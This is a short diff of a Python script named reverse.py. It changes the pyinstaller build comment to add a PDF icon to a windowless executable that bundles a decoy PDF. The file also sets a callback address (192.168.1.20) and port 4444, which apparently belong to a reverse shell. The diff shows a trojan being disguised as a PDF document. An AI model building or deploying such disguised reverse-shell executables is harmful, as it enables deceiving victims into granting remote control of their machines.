@@ -5,7 +5,7 @@ import os
 import sys
 from shutil import copyfile
 
-# pyinstaller --onefile --noconsole --add-data "stack_for_fun.pdf;." reverse.py
+# pyinstaller --onefile --noconsole --add-data "stack_for_fun.pdf;." --icon pdf.ico reverse.py
 
 address = "192.168.1.20"
 port = 4444
